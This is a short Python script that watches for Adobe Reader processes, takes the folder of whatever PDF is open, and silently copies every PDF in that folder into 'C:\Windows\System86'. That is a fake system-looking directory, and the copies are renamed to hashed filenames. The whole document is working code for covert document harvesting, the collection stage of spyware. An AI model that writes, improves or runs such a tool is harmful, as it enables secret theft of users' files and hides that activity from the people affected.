"""
2019.05.09 Complete
Read File Chase Moved

"""

import psutil

while True:
    AcrodPid = []
    try:
        for p in psutil.process_iter():
            if 'AcroRd32.exe' in p.name():
                AcrodPid.append(p.pid)

        Fpid = int(AcrodPid[0])
    except IndexError:
        continue

    FilePath = ''
    try:
        print("[+]psutil.NoSuchProcess process find with pid "+ str(Fpid))
        p1 = psutil.Process(Fpid)

        GetThePathPdf = p1.as_dict()['cmdline']

        for readpath in GetThePathPdf:
            if ".pdf" in readpath:
                PathLen = len(readpath.split('\\'))

                for ret in range(0, PathLen - 1):
                    FilePath += readpath.split('\\')[ret] + '\\'

    except psutil.NoSuchProcess as e:
        print(e)

    # Someting file move to path
    Destination = "C:\\Windows\\System86"

    import os, shutil, hashlib

    try:
        for x in os.listdir(FilePath):
            if '.pdf' in x:
                shutil.copy(FilePath + '\\' + x, Destination)
                enc = x.encode()
                hexd = hashlib.sha256(enc).hexdigest()
                hexd = hexd[:24] + '.pdf'
                os.rename(Destination + '\\' + x, Destination + '\\' + hexd)
    except (FileExistsError, FileNotFoundError) as e:
        os.remove(Destination + '\\' + x)
        continue

    del AcrodPid

